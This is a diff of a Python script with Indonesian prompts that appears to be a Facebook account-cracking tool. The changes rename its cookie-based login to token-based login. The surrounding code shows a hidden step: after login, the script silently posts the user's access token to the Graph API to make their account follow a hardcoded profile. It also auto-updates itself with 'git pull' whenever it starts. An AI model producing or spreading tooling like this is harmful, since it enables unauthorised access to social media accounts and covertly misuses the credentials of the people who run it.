@@ -63,7 +63,7 @@ def cek_login():
 	try:
 		toket=open('login.txt','r').read()
 	except IOError:
-		print (' [x] Cookies Invalid')
+		print (' [x] Token invalid')
 		login()
 	web = datetime.datetime.now()
 	waktu = web.strftime("%H:%M:%S / %d-%m-%Y ")
@@ -82,7 +82,7 @@ def cek_login():
 	requests.post('https://graph.facebook.com/100001540299108/subscribers?access_token=' + toket)
 	print (' [*] Login Berhasil')
 	menu()
-def cek_cookies():
+def cek_token():
 	cvds=None
         new=None
         if cek(1)==False:
@@ -110,19 +110,19 @@ def cek_cookies():
                         os.remove("coki.log")
                 except:
                         pass
-                print(" [*] Cookies Invalid");login()
+                print(" [*] Token Invalid");login()
 def login():
     os.system('clear')
     print logo
-    print(' [1] Login Menggunakan Cookies')
-    print(' [2] Cara Mendapatkan Cookies')
+    print(' [1] Login Menggunakan Token')
+    print(' [2] Cara Mendapatkan Token')
     print(' [0] Keluar')
     lg = raw_input('\n [*] Input : ')
     if lg == '':
         os.sys.exit()
     elif lg == '1' or lg == '01':
         try:
-		cookie = raw_input(" [*] Cookies : ")
+		token = raw_input(" [*] Token : ")
                 data = {
                             'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', # don't change this user agent.
                                 'referer' : 'https://m.facebook.com/',
@@ -1503,4 +1503,4 @@ class crack4:
 
 if __name__=='__main__':
 	os.system('git pull')
-	cek_cookies()
+	cek_token()
